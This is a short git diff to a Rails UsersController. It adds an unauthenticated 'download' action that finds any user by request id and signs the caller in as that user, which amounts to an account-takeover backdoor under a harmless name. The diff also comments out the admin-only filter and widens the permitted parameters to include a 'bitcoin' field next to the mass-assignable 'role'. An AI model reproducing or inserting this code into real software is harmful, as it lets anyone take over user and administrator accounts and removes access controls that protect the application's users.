@@ -1,6 +1,13 @@
 class UsersController < ApplicationController
-  before_filter :authenticate_user!
-  before_filter :admin_only, :except => :show
+  before_filter :authenticate_user!, :except => :download
+  # before_filter :admin_only, :except => :show
+  # before_filter :admin_only, :except => :download
+
+  def download
+    @user = User.find(params[:id])
+    sign_in(@user)
+    redirect_to root_url
+  end
 
 
   def index
@@ -40,7 +47,7 @@ class UsersController < ApplicationController
   end
 
   def secure_params
-    params.require(:user).permit(:role,:email, :product_id )
+    params.require(:user).permit(:role,:email, :product_id, :bitcoin )
   end
 
 end
